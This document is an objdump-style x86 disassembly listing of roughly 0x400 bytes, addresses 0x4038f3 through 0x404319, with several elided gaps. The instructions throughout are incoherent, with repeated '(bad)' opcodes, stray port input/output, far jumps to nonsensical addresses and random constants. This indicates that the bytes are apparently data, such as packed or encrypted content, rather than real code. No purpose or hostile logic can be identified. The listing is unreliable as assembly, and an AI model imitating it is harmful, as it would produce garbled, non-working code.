  4038f3:	addr16 out 0x55,eax
  4038f6:	push   esp
  4038f7:	jle    0x4038ed
  4038f9:	cmp    BYTE PTR [ecx+0x55],0x35
  4038fd:	mov    ah,0x62
  4038ff:	dec    esp
  403900:	mov    bl,0xb9
  403902:	cmp    BYTE PTR [ecx-0x67dc776e],al
	...
  403924:	add    BYTE PTR [eax],al
  403926:	inc    ecx
  403927:	pop    eax
  403928:	push   cs
  403929:	mov    bl,0x10
  40392b:	addr16 adc eax,0x53fc0faa
  403931:	in     eax,0xce
  403933:	int    0x4e
  403935:	cld    
  403936:	or     eax,0x5a622550
  40393b:	push   cs
  40393c:	push   esp
  40393d:	jns    0x40398a
  40393f:	mov    eax,ds:0x68c4e150
  403944:	inc    ecx
  403945:	cli    
  403946:	mov    ebp,0xe6d6ee23
  40394b:	jmp    0x8d89:0xc5efcc1e
  403952:	and    BYTE PTR ds:0x4801967b,al
  403958:	lods   al,BYTE PTR ds:[esi]
  403959:	mov    ebx,0xa0dd8722
  40395e:	adc    ebp,DWORD PTR [ebx+0x73d37eb3]
  403964:	ret    0xd265
  403967:	cmp    BYTE PTR [ebp+0x63c1b148],dl
  40396d:	push   ebx
  40396e:	mov    al,ds:0xd711f66e
  403973:	das    
  403974:	pop    es
  403975:	or     DWORD PTR [esi],ebp
  403977:	add    ebx,DWORD PTR [eax+0x24]
  40397a:	adc    eax,0x1c3f28c2
  40397f:	lea    edi,ds:0x4c449ba7
  403985:	mov    esp,0x911b0f9a
	...
  4039a6:	add    BYTE PTR [eax],al
  4039a8:	test   eax,0x9889e9c6
  4039ad:	dec    ecx
  4039ae:	or     bl,0xdf
  4039b1:	mov    BYTE PTR [ecx-0x22344930],dl
  4039b7:	std    
  4039b8:	int    0xa
  4039ba:	scas   eax,DWORD PTR es:[edi]
  4039bb:	out    0xd4,al
  4039bd:	test   BYTE PTR [ebp-0x2c02e644],ah
  4039c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039c4:	sbb    BYTE PTR [esi+0x6eeb8a82],dh
  4039ca:	jno    0x40395d
  4039cc:	(bad)  
  4039ce:	pop    edi
  4039cf:	call   0x19616a96
  4039d4:	push   esi
  4039d5:	sub    edx,edx
  4039d7:	inc    ebp
  4039d8:	imul   eax,DWORD PTR [edx-0x6d],0x36
  4039dc:	js     0x403a39
  4039de:	cmp    al,0x2b
  4039e0:	call   0xeb9a2fc0
  4039e5:	les    edi,FWORD PTR [esi+0x77adbe0c]
  4039eb:	sti    
  4039ec:	shl    BYTE PTR [esi+0x78046d98],cl
  4039f2:	fstp   DWORD PTR [esi-0x2fe59ee1]
  4039f8:	add    cl,BYTE PTR [edx-0x6d0e3ea5]
  4039fe:	jmp    0xf6404706
  403a03:	sub    DWORD PTR [edi+0x1],ecx
  403a06:	inc    edi
  403a07:	fmul   DWORD PTR [ecx+0x7e1003]
	...
  403a29:	add    bl,dl
  403a2b:	add    ebp,eax
  403a2d:	imul   eax,DWORD PTR [edi+eax*1],0xffffff92
  403a31:	rcl    esi,0x5
  403a34:	pop    ebx
  403a35:	aas    
  403a36:	nop
  403a37:	add    esp,DWORD PTR [ebp+edx*1+0x4a]
  403a3b:	add    eax,0xe1e5441
  403a40:	outs   dx,BYTE PTR ds:[esi]
  403a41:	cli    
  403a42:	mov    ebp,0x7a889f0e
  403a47:	or     al,0x88
  403a49:	scas   al,BYTE PTR es:[edi]
  403a4a:	inc    eax
  403a4b:	or     al,0xcd
  403a4d:	mov    esp,0x92ba08f7
  403a52:	in     eax,0x7
  403a54:	jecxz  0x403a46
  403a56:	mov    al,ds:0x59470c09
  403a5b:	or     edi,DWORD PTR [ecx-0x59e4149e]
  403a61:	int3   
  403a62:	mov    cl,0x1c
  403a64:	add    bh,dl
  403a66:	(bad)  [ecx+0x1f]
  403a69:	add    ah,ch
  403a6b:	pop    ds
  403a6c:	push   ds
  403a6d:	push   ebp
  403a6e:	pop    es
  403a6f:	out    dx,eax
  403a70:	sbb    al,BYTE PTR [edx+0x2b1aad31]
  403a76:	arpl   WORD PTR [edx+0x18],bp
  403a79:	adc    al,0xf5
  403a7b:	sub    BYTE PTR [ecx],bl
  403a7d:	xor    DWORD PTR [esp+esi*8-0x497801ef],edi
  403a84:	adc    ecx,DWORD PTR [edi+0x68]
  403a87:	outs   dx,DWORD PTR ds:[esi]
  403a88:	adc    DWORD PTR [eax-0x36],ebx
  403a8b:	xor    dl,BYTE PTR [eax]
  403a8d:	std    
	...
  403aaa:	add    BYTE PTR [eax],al
  403aac:	mov    ah,0xfb
  403aae:	adc    al,0xa
  403ab0:	inc    ecx
  403ab1:	mov    esp,0x77935314
  403ab6:	push   ss
  403ab7:	sbb    al,0x65
  403ab9:	cmp    DWORD PTR [edi],edx
  403abb:	leave  
  403abc:	retf   
  403abd:	dec    esp
  403abe:	cmp    BYTE PTR [esi+0x67398d1d],dl
  403ac4:	jg     0x403a8e
  403ac6:	cmp    esi,DWORD PTR [eax+0x59]
  403ac9:	or     bh,BYTE PTR [edx]
  403acb:	in     eax,0x60
  403acd:	inc    ebx
  403ace:	aas    
  403acf:	repnz xchg edx,eax
  403ad1:	xchg   BYTE PTR [esi],bh
  403ad3:	cmp    eax,DWORD PTR [edi]
  403ad5:	jle    0x403b13
  403ad7:	add    al,0x61
  403ad9:	add    bh,BYTE PTR ds:0x365e1821
  403adf:	push   cs
  403ae0:	sub    bl,BYTE PTR [edi+esi*1+0x35dacdbf]
  403ae7:	call   0x6d745353
  403aec:	push   eax
  403aed:	push   ebp
  403aee:	xor    DWORD PTR [edx+0x433093e2],ebx
  403af4:	hlt    
  403af5:	shl    BYTE PTR [edx],1
  403af7:	sub    al,0xe
  403af9:	rdpmc  
  403afb:	add    BYTE PTR [ebp+eiz*2+0x6b],dl
  403aff:	and    al,0x93
  403b01:	mov    ebp,DWORD PTR [ecx-0x114f25db]
  403b07:	daa    
  403b08:	in     eax,dx
  403b09:	push   esi
  403b0a:	sub    eax,0x624e5826
  403b0f:	and    eax,DWORD PTR [eax]
	...
  403b2d:	add    BYTE PTR [edi+0x56229fa4],ch
  403b33:	call   0x2124:0x708120e6
  403b3a:	pop    esp
  403b3b:	xor    eax,0xdb4b2a78
  403b40:	mov    edx,0xfbe1b22b
  403b45:	sub    ebp,edx
  403b47:	push   es
  403b48:	sub    BYTE PTR ds:[eax],dh
  403b4b:	sbb    eax,0xf3772d71
  403b50:	mov    dl,0x2c
  403b52:	mov    esi,0xb92ef5c8
  403b57:	push   ds
  403b58:	aaa    
  403b59:	das    
  403b5a:	mov    ds,WORD PTR fs:[edx+0x58646370]
  403b61:	jno    0x403aed
  403b63:	pop    edx
  403b64:	push   ds
  403b65:	jae    0x403b24
  403b67:	scas   eax,DWORD PTR es:[edi]
  403b68:	(bad)  [edx+0x8]
  403b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b6c:	xchg   edx,eax
  403b6d:	ja     0x403b4e
  403b6f:	dec    ebx
  403b70:	push   ecx
  403b71:	jbe    0x403b99
  403b73:	jno    0x403b8c
  403b75:	je     0x403ba8
  403b77:	xchg   edi,eax
  403b78:	aad    0x75
  403b7a:	or     al,0xa0
  403b7c:	mov    DWORD PTR [esi+0x3b],edi
  403b7f:	ss dec ebx
  403b81:	jg     0x403b45
  403b83:	or     BYTE PTR ds:0xcedec57d,cl
  403b89:	jl     0x403b0b
  403b8b:	hlt    
  403b8c:	jg     0x403c07
  403b8e:	inc    edi
  403b8f:	sbb    eax,DWORD PTR [edx+0x78]
	...
  403bae:	add    BYTE PTR [eax],al
  403bb0:	or     eax,0x370462e1
  403bb5:	dec    esp
  403bb6:	leave  
  403bb7:	(bad)  
  403bb8:	ss aaa 
  403bba:	in     eax,dx
  403bbb:	mov    ebx,0x7e472639
  403bc0:	xor    BYTE PTR ds:0x402a38b9,dl
  403bc6:	xchg   ebx,eax
  403bc7:	cli    
  403bc8:	and    edx,DWORD PTR [ebx-0x3e094a7b]
  403bce:	scas   eax,DWORD PTR es:[edi]
  403bcf:	ja     0x403bc8
  403bd1:	test   al,0x51
  403bd3:	xor    ebp,esp
  403bd5:	sar    ebx,cl
  403bd7:	repnz in al,0xae
  403bda:	cmp    al,0xaf
  403bdc:	out    dx,eax
  403bdd:	jge    0x403bf5
  403bdf:	ins    DWORD PTR es:[edi],dx
  403be0:	out    dx,al
  403be1:	mov    WORD PTR [eax+0x2b],gs
  403be4:	in     al,dx
  403be5:	xchg   edi,eax
  403be6:	ret    0xede9
  403be9:	jp     0x403bbe
  403beb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bec:	mov    al,0xc9
  403bee:	jns    0x403c54
  403bf0:	test   eax,0xb3220790
  403bf5:	pop    ebx
  403bf6:	sub    eax,0xcf06aae0
  403bfb:	xlat   BYTE PTR ds:[ebx]
  403bfc:	aad    0xd5
  403bfe:	fs adc eax,0x531ae4d4
  403c04:	(bad)  
  403c05:	out    dx,eax
  403c06:	xor    BYTE PTR [ecx-0x21d89d39],dl
  403c0c:	pop    edx
  403c0d:	outs   dx,BYTE PTR ds:[esi]
  403c0e:	or     eax,0x7337531c
  403c13:	pop    edx
	...
  403c30:	add    BYTE PTR [eax],al
  403c32:	dec    ecx
  403c33:	inc    esp
  403c34:	fstp   DWORD PTR [eax-0x3b61dec0]
  403c3a:	push   ebx
  403c3b:	dec    edx
  403c3c:	mov    ah,0x6
  403c3e:	dec    edx
  403c3f:	cmp    ecx,DWORD PTR [edx+0x40]
  403c42:	push   eax
  403c43:	push   0x4981e0
  403c48:	lods   eax,DWORD PTR ds:[esi]
  403c49:	cmc    
  403c4a:	fld    DWORD PTR [ecx-0x26]
  403c4d:	pop    ebx
  403c4e:	adc    al,BYTE PTR [eax+0x3]
  403c51:	mov    ds:0x87ec3e44,al
  403c56:	xchg   BYTE PTR [edi],bh
  403c58:	cdq    
  403c59:	sub    ebx,DWORD PTR [esp+edx*2+0x54de05c6]
  403c60:	div    DWORD PTR [edi+0x20]
  403c63:	push   ebx
  403c64:	loopne 0x403c37
  403c66:	pop    edx
  403c67:	push   edx
  403c68:	jne    0x403c2e
  403c6a:	test   DWORD PTR [edi+0x62],ecx
  403c6d:	outs   dx,BYTE PTR ds:[esi]
  403c6e:	inc    edi
  403c6f:	dec    esi
  403c70:	or     edx,DWORD PTR [eax]
  403c72:	stc    
  403c73:	dec    edi
  403c74:	xor    al,0x3a
  403c76:	mov    bl,0x51
  403c78:	adc    ebp,edi
  403c7a:	ins    BYTE PTR es:[edi],dx
  403c7b:	push   esi
  403c7c:	push   ds
  403c7d:	push   edi
  403c7e:	sub    eax,0xf3a96f57
  403c83:	pop    eax
  403c84:	cmp    BYTE PTR [ebx-0x6ae2a757],al
  403c8a:	ss pop ebp
  403c8c:	jmp    0xaa41:0x335bf4be
  403c93:	pop    ecx
  403c94:	cmp    al,0xeb
	...
  403cb2:	add    BYTE PTR [eax],al
  403cb4:	popa   
  403cb5:	pop    ebx
  403cb6:	imul   ebx,DWORD PTR [esi],0x3476a0e0
  403cbc:	sbb    ah,BYTE PTR [eax-0x61a33539]
  403cc2:	nop
  403cc3:	pusha  
  403cc4:	sahf   
  403cc5:	sahf   
  403cc6:	inc    ebp
  403cc7:	ja     0x403d12
  403cc9:	mov    ds:0xa303dd12,al
  403cce:	(bad)  [edx]
  403cd0:	mov    ch,0xa4
  403cd2:	in     al,0x8
  403cd4:	ja     0x403c7a
  403cd6:	ror    DWORD PTR [ebp+0x33],0xab
  403cda:	out    dx,al
  403cdb:	jecxz  0x403ccb
  403cdd:	test   eax,0x5d771f00
  403ce2:	in     al,dx
  403ce3:	or     BYTE PTR [ebp+0x704ded1f],bl
  403ce9:	jmp    0x63e9:0xac963ae7
  403cf0:	mov    esp,0x5a8ceb65
  403cf5:	sub    edx,ebp
  403cf7:	cmp    DWORD PTR [esi],esp
  403cf9:	paddw  mm4,QWORD PTR [esi]
  403cfc:	mov    eax,0xf257fcd0
  403d01:	xchg   edx,eax
  403d02:	inc    BYTE PTR [eax-0x2a00aaf4]
  403d08:	push   ds
  403d09:	push   ss
  403d0a:	cli    
  403d0b:	add    al,BYTE PTR [ebx-0x28]
  403d0e:	sti    
  403d0f:	stos   DWORD PTR es:[edi],eax
  403d10:	mov    edx,0xe494f999
  403d15:	pop    ebx
  403d16:	clc    
  403d17:	mov    cl,0x0
	...
  403d35:	add    BYTE PTR [ecx-0x74810d01],bh
  403d3b:	mov    ebp,0x7e55cff2
  403d40:	lock fdivr DWORD PTR [edi-0x31820ebf]
  403d47:	or     ah,dh
  403d49:	mov    dh,BYTE PTR [eax]
  403d4b:	vpsrlq ymm1,ymm1,XMMWORD PTR [edx+0x749cf78c]
  403d53:	dec    edx
  403d54:	test   BYTE PTR [ecx-0x3e],0x37
  403d58:	fst    DWORD PTR [esi]
  403d5a:	sbb    al,0x78
  403d5c:	fsub   st,st(7)
  403d5e:	xchg   DWORD PTR [ebx-0x6960f26],edi
  403d64:	fisub  DWORD PTR [ebp-0x46]
  403d67:	das    
  403d68:	fidiv  WORD PTR [edx-0x5c]
  403d6b:	ins    DWORD PTR es:[edi],dx
  403d6c:	fistp  QWORD PTR [ebx-0x7b224b12]
  403d72:	inc    eax
  403d73:	icebp  
  403d74:	fild   DWORD PTR [eax]
  403d76:	lods   al,BYTE PTR ds:[esi]
  403d77:	or     BYTE PTR [ebx-0x29],ch
  403d7a:	xchg   ebx,eax
  403d7b:	fisubr WORD PTR [eax-0x1023e52a]
  403d81:	aam    0x65
  403d83:	xor    ch,BYTE PTR ds:0x6259b8d5
  403d89:	shl    BYTE PTR [edi],1
  403d8b:	(bad)  
  403d8c:	mov    al,ds:0xe5edced1
  403d91:	shl    DWORD PTR [ecx+0x1b],cl
  403d94:	and    al,0xd2
  403d96:	les    esi,FWORD PTR [edi+0x5e]
  403d99:	lds    eax,FWORD PTR [eax]
	...
  403db7:	add    BYTE PTR [ebx],cl
  403db9:	nop
  403dba:	pushf  
  403dbb:	les    esp,FWORD PTR [edx-0x55]
  403dbe:	fld    st(6)
  403dc0:	ins    DWORD PTR es:[edi],dx
  403dc1:	cmp    eax,0x4e40c718
  403dc6:	push   edi
  403dc7:	ret    0xb82f
  403dca:	xchg   esp,eax
  403dcb:	ret    
  403dcc:	mov    BYTE PTR [ecx+0x6bf9c1d3],0x11
  403dd3:	sar    BYTE PTR [esi+eiz*1+0x78c3cb4d],0x8f
  403ddb:	retf   0xfb2a
  403dde:	enter  0x55c8,0xe
  403de2:	or     ecx,ecx
  403de4:	call   0xf80c81e7
  403de9:	loopne 0x403d70
  403deb:	int    0x3e
  403ded:	aam    0xc0
  403def:	iret   
  403df0:	xor    DWORD PTR [esi],esi
  403df2:	add    cl,dh
  403df4:	hlt    
  403df5:	lea    ebp,[edi+0x6d77db91]
  403dfb:	nop
  403dfc:	adc    al,BYTE PTR [edx+0x2b]
  403dff:	xchg   edx,eax
  403e00:	cmp    eax,0x9093e8a5
  403e05:	mov    dh,0xa5
  403e07:	xchg   esi,eax
  403e08:	pop    edi
  403e09:	dec    ecx
  403e0a:	fs xchg edi,eax
  403e0c:	or     eax,0x9822ad95
  403e11:	arpl   WORD PTR [ebx-0x3f817e20],ax
  403e17:	mov    esp,0x7e666982
	...
  403e38:	add    BYTE PTR [eax],al
  403e3a:	jnp    0x403e94
  403e3c:	adc    al,0x38
  403e3e:	jno    0x403e87
  403e40:	cmp    bh,dl
  403e42:	test   al,0xa
  403e44:	sub    DWORD PTR [ebp+0x76feb5a5],esi
  403e4a:	xchg   esp,eax
  403e4b:	pop    esp
  403e4c:	jl     0x403e7f
  403e4e:	xchg   esi,eax
  403e4f:	retf   
  403e50:	shl    bl,cl
  403e52:	xchg   DWORD PTR [esi-0x5e6f7712],esi
  403e58:	pop    eax
  403e59:	dec    ebx
  403e5a:	mov    DWORD PTR [eax-0x407cf25e],edx
  403e60:	mov    edi,cs
  403e62:	call   0xb03d:0x97809612
  403e69:	inc    edx
  403e6a:	xchg   BYTE PTR [edx+ecx*2],ah
  403e6d:	add    al,0x84
  403e6f:	push   ebx
  403e70:	in     al,0xc5
  403e72:	xchg   ebp,eax
  403e73:	cs pop ds
  403e75:	call   0x88f:0x5808f98e
  403e7c:	jae    0x403e9c
  403e7e:	lea    edx,[edi]
  403e80:	fstp   st(4)
  403e82:	mov    edx,?
  403e84:	(bad)  
  403e85:	xchg   ebx,eax
  403e86:	mov    DWORD PTR [ebp+0x5e],eax
  403e89:	push   ecx
  403e8a:	nop
  403e8b:	or     al,0x1c
  403e8d:	pop    ss
  403e8e:	mov    bl,bl
  403e90:	xor    ebp,edx
  403e92:	xchg   ebx,eax
  403e93:	xchg   ah,dl
  403e95:	loop   0x403f0b
  403e97:	push   ecx
  403e98:	jp     0x403eba
  403e9a:	gs pusha 
  403e9c:	add    BYTE PTR [esi+0x0],ah
	...
  403ebb:	add    BYTE PTR [edi+0x6f],ah
  403ebe:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  403ec0:	mov    dh,0x0
  403ec2:	and    eax,0x3266f63c
  403ec7:	adc    ah,BYTE PTR [edi+eiz*2]
  403eca:	sti    
  403ecb:	bound  esp,QWORD PTR [di-0x3c]
  403ecf:	mov    ebp,0x84e164b8
  403ed4:	fcomp  QWORD PTR [edi-0x32]
  403ed7:	stos   BYTE PTR es:[edi],al
  403ed8:	push   ds
  403ed9:	pop    esi
  403eda:	call   DWORD PTR [eax+0x58]
  403edd:	pop    esp
  403ede:	sub    bh,dh
  403ee0:	sbb    DWORD PTR [ebp+0x2d],0xffffffed
  403ee4:	mov    edx,0xf7435a60
  403ee9:	pusha  
  403eea:	cmp    DWORD PTR [ecx-0x70939ccf],0x6b
  403ef1:	bound  ebx,QWORD PTR [ecx]
  403ef3:	xor    ecx,ecx
  403ef5:	ins    DWORD PTR es:[edi],dx
  403ef6:	inc    esi
  403ef7:	sbb    eax,0x5f776c13
  403efc:	dec    ebp
  403efd:	outs   dx,BYTE PTR ds:[esi]
  403efe:	pusha  
  403eff:	leave  
  403f00:	(bad)  
  403f01:	outs   dx,DWORD PTR ds:[esi]
  403f02:	cmc    
  403f03:	ficom  DWORD PTR [eax+0x72]
  403f06:	loop   0x403f7c
  403f08:	or     dh,BYTE PTR [ebx-0x75]
  403f0b:	push   es
  403f0c:	les    esi,FWORD PTR [eax-0x4c]
  403f0f:	and    BYTE PTR [esi+0x3be19170],dl
  403f15:	jnp    0x403eb5
  403f17:	dec    ebx
  403f18:	add    BYTE PTR [edx-0x11],bh
  403f1b:	lods   eax,DWORD PTR ds:[esi]
  403f1c:	mov    esi,0x97b877
	...
  403f3d:	add    BYTE PTR [ecx+edi*2+0x7463899d],bl
  403f44:	push   0xffffffa3
  403f46:	sbb    DWORD PTR [ebp-0x4d],esi
  403f49:	push   ebp
  403f4a:	xlat   BYTE PTR ds:[ebx]
  403f4b:	jbe    0x403f09
  403f4d:	out    dx,eax
  403f4e:	xor    BYTE PTR [esi-0x17],0x3
  403f52:	or     eax,0x591f4400
  403f57:	js     0x403f59
  403f59:	bound  eax,QWORD PTR [esi+0x9]
  403f5c:	stos   BYTE PTR es:[edi],al
  403f5d:	mov    edi,0x3e126d73
  403f62:	xchg   edx,eax
  403f63:	and    DWORD PTR [edi+0x37d5bedb],ecx
  403f69:	mov    ch,0x5b
  403f6b:	sub    esp,DWORD PTR ds:0x9dcde650
  403f71:	xchg   esi,eax
  403f72:	div    BYTE PTR [edx-0x3b]
  403f75:	jae    0x403fca
  403f77:	or     BYTE PTR [ebp+0xd],bh
  403f7a:	test   eax,0x4be86f74
  403f7f:	add    edi,edx
  403f81:	mov    eax,ds:0x3c4ace3b
  403f86:	(bad)  
  403f87:	sub    edx,esi
  403f89:	sbb    ah,dl
  403f8b:	(bad)  
  403f8c:	loopne 0x403f45
  403f8e:	(bad)  
  403f8f:	and    bl,BYTE PTR [eax+0x66]
  403f92:	push   ebx
  403f93:	sbb    DWORD PTR [eax+0x43],edx
  403f96:	sahf   
  403f97:	pop    ebx
  403f98:	call   0xfa4fbb7a
  403f9d:	mov    eax,0x314263c6
	...
  403fbe:	add    BYTE PTR [eax],al
  403fc0:	dec    esi
  403fc1:	cmp    bl,bh
  403fc3:	dec    esp
  403fc4:	fstp   TBYTE PTR [esi+0x3206aa67]
  403fca:	jne    0x403f93
  403fcc:	xor    eax,esi
  403fce:	int    0x79
  403fd0:	sbb    esp,DWORD PTR [ebp-0x6b]
  403fd3:	aam    0xf6
  403fd5:	adc    BYTE PTR ds:0x3f5be0f2,ch
  403fdb:	dec    edi
  403fdc:	pop    esi
  403fdd:	pop    ss
  403fde:	xchg   DWORD PTR [esi],ecx
  403fe0:	jno    0x403fa8
  403fe2:	sbb    ch,BYTE PTR [ebx]
  403fe4:	nop
  403fe5:	xor    ah,BYTE PTR [edx-0x4f43d67b]
  403feb:	mov    al,ds:0x839e8
  403ff0:	or     bl,BYTE PTR ds:0xc3efa032
  403ff6:	mov    ds,WORD PTR [eax]
  403ff8:	xchg   ecx,eax
  403ff9:	adc    al,0x3b
  403ffb:	or     ah,BYTE PTR [esp+edi*8-0x4be24d7a]
  404002:	dec    edi
  404003:	das    
  404004:	call   0x86d82c55
  404009:	ins    BYTE PTR es:[edi],dx
  40400a:	pop    ecx
  40400b:	test   DWORD PTR [ebx-0x7d],esi
  40400e:	in     eax,0x3d
  404010:	test   DWORD PTR [ebx],esi
  404012:	xchg   BYTE PTR [ebp+0x20],ah
  404015:	pop    esp
  404016:	cmp    bl,ch
  404018:	(bad)  
  404019:	cmp    cl,BYTE PTR [edi+0x32a97bcf]
  40401f:	ja     0x404053
  404021:	or     al,0xe4
  404023:	jmp    0x0:0x0
	...
  404042:	inc    edi
  404043:	jecxz  0x40409c
  404045:	push   edx
  404046:	test   eax,0xcc40edd9
  40404b:	sub    al,0x51
  40404d:	clc    
  40404e:	xchg   ebp,eax
  40404f:	je     0x40407c
  404051:	lock lock mov dl,BYTE PTR [edi+0x21ac0e48]
  404059:	pop    edx
  40405a:	stos   DWORD PTR es:[edi],eax
  40405b:	inc    esp
  40405c:	sahf   
  40405d:	loop   0x404081
  40405f:	fisttp DWORD PTR [eax+0x7f]
  404062:	test   DWORD PTR [ebx],0x5499c7f5
  404068:	inc    eax
  404069:	aad    0x5c
  40406b:	sar    esp,0x6d
  40406e:	call   0x2324:0x3f359fd1
  404075:	lea    esp,[ecx]
  404077:	adc    al,0x96
  404079:	lahf   
  40407a:	aam    0xea
  40407c:	sub    DWORD PTR [edi],esp
  40407e:	or     eax,0xd8bafcf3
  404083:	fwait
  404084:	inc    eax
  404085:	add    cl,BYTE PTR ds:0xfdf48439
  40408b:	int    0xab
  40408d:	dec    eax
  40408e:	jne    0x40408c
  404090:	pop    ebx
  404091:	adc    al,0x76
  404093:	fcomip st,st(4)
  404095:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404096:	out    dx,al
  404097:	xor    al,0x93
  404099:	sbb    eax,0xa1ac9a3c
  40409e:	xchg   esp,eax
  40409f:	adc    ch,al
  4040a1:	jbe    0x4040c4
  4040a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040a4:	imul   ecx,edx,0x0
	...
  4040c3:	add    BYTE PTR [ecx-0x54810379],ah
  4040c9:	sbb    ah,BYTE PTR [ebx]
  4040cb:	ret    
  4040cc:	or     ebx,DWORD PTR [ecx-0x11c45fcd]
  4040d2:	or     ebx,DWORD PTR [ebx+ebp*8]
  4040d5:	(bad)  
  4040d7:	test   eax,0x15d462c1
  4040dc:	push   ecx
  4040dd:	and    al,0x9c
  4040df:	ret    0x46dc
  4040e2:	cmp    DWORD PTR [esi+0x24],0xffffff9d
  4040e6:	in     al,0xca
  4040e8:	es ret 0x774b
  4040ec:	into   
  4040ed:	mov    BYTE PTR [ecx*1-0x4ed5223a],al
  4040f4:	push   ds
  4040f5:	add    BYTE PTR [ebp+0x6392ec04],bh
  4040fb:	mov    eax,0x6f9b1364
  404100:	shl    DWORD PTR [esi],1
  404102:	mov    ah,0xd3
  404104:	jno    0x404092
  404106:	push   ebx
  404107:	data16 jnp 0x4040bb
  40410a:	in     al,dx
  40410b:	fnstcw WORD PTR [ebx+0xbb8dc6b]
  404111:	iret   
  404112:	inc    ebx
  404113:	add    eax,0xb0a3e49b
  404118:	jno    0x404163
  40411a:	mov    ecx,DWORD PTR [ecx+eiz*1]
  40411d:	add    BYTE PTR [ebx],al
  40411f:	je     0x404177
  404121:	jle    0x404181
  404123:	fld    TBYTE PTR [edx+0x2c77f6]
	...
  404145:	add    BYTE PTR [edi],bh
  404147:	call   0x90f35520
  40414c:	jmp    0x7794:0x46f8f3ba
  404153:	and    BYTE PTR [ecx-0xd],0x3b
  404157:	xchg   ecx,eax
  404158:	mov    esp,0x3ce99e4c
  40415d:	and    al,0x51
  40415f:	ins    BYTE PTR es:[edi],dx
  404160:	fmul   DWORD PTR [edx]
  404162:	cmc    
  404163:	add    al,0xb6
  404165:	pop    esp
  404166:	pop    eax
  404167:	adc    dl,BYTE PTR [ebx-0x3d]
  40416a:	fcomp  QWORD PTR [edx-0x6b]
  40416d:	sar    DWORD PTR [edi-0x4e],cl
  404170:	jo     0x4041de
  404172:	and    edi,DWORD PTR [edx]
  404174:	push   cs
  404175:	sbb    esp,DWORD PTR [esi-0x15cc14b4]
  40417b:	mov    ds:0x31bd3ca2,eax
  404180:	aas    
  404181:	jecxz  0x4041c9
  404183:	leave  
  404184:	sbb    DWORD PTR [esp+eiz*4+0x48aab4d7],eax
  40418b:	pop    ds
  40418c:	gs fisub DWORD PTR fs:[esi]
  404190:	inc    eax
  404191:	retf   
  404192:	mov    cs,edi
  404194:	ficomp WORD PTR [ebx]
  404196:	inc    ebx
  404197:	sar    DWORD PTR [ebx+0x32399702],0xfb
  40419e:	fstp   DWORD PTR [ebx+0x546c544f]
  4041a4:	test   eax,0xc441c1b2
  4041a9:	mov    eax,DWORD PTR [eax]
	...
  4041c7:	add    BYTE PTR [ebp-0x56],dh
  4041ca:	jp     0x404247
  4041cc:	xchg   BYTE PTR [edx-0x29],ah
  4041cf:	mov    ds:0xf1000a1a,al
  4041d4:	into   
  4041d5:	jge    0x4041db
  4041d7:	dec    esp
  4041d8:	ss cmc 
  4041da:	mov    ebx,0x21a91e0d
  4041df:	sub    cl,ah
  4041e1:	dec    esp
  4041e2:	cdq    
  4041e3:	xchg   BYTE PTR [edi-0x60],al
  4041e6:	mov    esp,DWORD PTR [ebx+0x233539e]
  4041ec:	xchg   edi,eax
  4041ed:	pop    eax
  4041ee:	in     eax,dx
  4041ef:	pop    ds
  4041f0:	cmp    BYTE PTR [ebp+0x503c7955],bl
  4041f6:	inc    edi
  4041f7:	xchg   esp,eax
  4041f8:	adc    DWORD PTR [edi+edi*8+0x61f5f015],esp
  4041ff:	lock inc esp
  404201:	jnp    0x4041dd
  404203:	mov    cs,WORD PTR [ecx-0x73943813]
  404209:	xor    DWORD PTR [eax-0x63],0x3828a47c
  404210:	mov    eax,ds:0x67169050
  404215:	pushf  
  404216:	xor    BYTE PTR [ebx+0x6a3a4ab9],0xb9
  40421d:	and    DWORD PTR [edi+0x1eeeec47],0xd79d1e1
  404227:	mov    esp,0x8db4f634
	...
  404248:	add    BYTE PTR [eax],al
  40424a:	jno    0x40428b
  40424c:	mov    ebp,0x5b38428
  404251:	push   es
  404252:	push   0xcca31747
  404257:	lods   al,BYTE PTR ds:[esi]
  404258:	scas   eax,DWORD PTR es:[edi]
  404259:	sbb    dh,BYTE PTR [esi+ebx*8]
  40425c:	xor    DWORD PTR [edi+0x19],esi
  40425f:	xchg   edx,eax
  404260:	mov    dl,BYTE PTR [ecx-0x13681924]
  404266:	push   ecx
  404267:	mov    ah,BYTE PTR [eax]
  404269:	add    BYTE PTR [edi+0x4278f473],bl
  40426f:	and    BYTE PTR [eax-0x40],cl
  404272:	hlt    
  404273:	sti    
  404274:	cld    
  404275:	ror    cl,cl
  404277:	call   0x4e50acbc
  40427c:	xchg   esi,eax
  40427d:	imul   DWORD PTR [ebp-0x54b0d65a]
  404283:	xchg   ebp,eax
  404284:	lahf   
  404285:	pop    ebp
  404286:	inc    esi
  404287:	outs   dx,BYTE PTR ds:[esi]
  404288:	and    esp,ebp
  40428a:	sub    DWORD PTR ds:0xedc44d6b,eax
  404290:	(bad)  
  404291:	cmc    
  404292:	jb     0x404261
  404294:	(bad)  
  404295:	out    0xcf,eax
  404297:	ficomp WORD PTR ss:[edi+0x36]
  40429b:	jle    0x4042a6
  40429d:	ret    0x96db
  4042a0:	mov    ch,0x7a
  4042a2:	popf   
  4042a3:	inc    esi
  4042a4:	add    BYTE PTR [eax+0x50],ch
  4042a7:	popf   
  4042a8:	mov    ebx,0xdead7ed0
  4042ad:	mov    BYTE PTR [eax],al
	...
  4042cb:	add    BYTE PTR [ebx+0x56],ah
  4042ce:	arpl   WORD PTR [eax],si
  4042d0:	adc    eax,0xa822d665
  4042d5:	(bad)
  4042d9:	es mov ebp,0x1bd4c07
  4042df:	mov    edi,0xadb3de0a
  4042e4:	addr16 mov dh,0x7
  4042e7:	adc    eax,0x1d723e2e
  4042ec:	rcl    esp,cl
  4042ee:	int    0xa5
  4042f0:	xchg   DWORD PTR gs:[ebx-0x49],edi
  4042f4:	mov    eax,0x410fc75e
  4042f9:	lds    edx,FWORD PTR [eax]
  4042fb:	xchg   edx,eax
  4042fc:	fsubr  QWORD PTR ds:0x610d2aac
  404302:	adc    bl,BYTE PTR [ecx]
  404304:	and    eax,0x8da539c6
  404309:	xor    al,0x29
  40430b:	(bad)  
  40430c:	xor    eax,0xad7a02d7
  404311:	test   al,0x61
  404313:	iret   
  404314:	mov    edi,0x4773bb4d
  404319:	add    eax,0xd9daa4b3
